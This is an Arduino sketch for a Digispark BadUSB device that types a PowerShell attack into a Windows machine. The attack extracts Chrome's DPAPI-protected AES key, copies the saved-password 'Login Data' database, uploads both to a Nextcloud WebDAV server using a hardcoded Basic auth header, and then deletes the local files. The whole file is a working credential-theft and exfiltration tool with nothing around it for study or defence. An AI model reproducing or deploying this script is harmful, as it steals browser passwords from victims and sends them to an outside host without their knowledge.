#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(1000);
  
  //Extract AES key
  DigiKeyboard.println(F("$localStateInfo = Get-Content -Raw ($env:LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Local State')  | ConvertFrom-Json"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("if ($localStateInfo) {$encryptedkey = [convert]::FromBase64String($localStateInfo.os_crypt.encrypted_key)}"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("Add-Type -AssemblyName System.Security"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("if ($encryptedkey -and [string]::new($encryptedkey[0..4]) -eq 'DPAPI') {"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(($encryptedkey | Select-Object -Skip 5), $null, 'CurrentUser')}"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("Set-Content key -Value $masterKey -Encoding Byte"));
  DigiKeyboard.delay(100);


  //Copy Login Data
  DigiKeyboard.println(F(" Copy-Item ($env:LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Login Data') -Destination 'Login Data'"));
  DigiKeyboard.delay(100);


  //Send mail with data
  
  DigiKeyboard.println(F("Invoke-WebRequest -Uri 'https://nextcloud.diezgarcia.com/public.php/webdav/key' -Method Put -Infile 'key'  -Headers @{ Authorization = 'Basic czJXM0tlZlBiN3NjQjVCOg=='} -UseBasicParsing"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("Invoke-WebRequest -Uri 'https://nextcloud.diezgarcia.com/public.php/webdav/Login%20Data' -Method Put -Infile 'Login Data'  -Headers @{ Authorization = 'Basic czJXM0tlZlBiN3NjQjVCOg=='} -UseBasicParsing"));
  DigiKeyboard.delay(100);

  DigiKeyboard.println(F("Remove-Item key"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("Remove-Item 'Login Data'"));
  DigiKeyboard.delay(100);

  DigiKeyboard.println(F("exit"));

  for(;;){ /*empty*/ }
}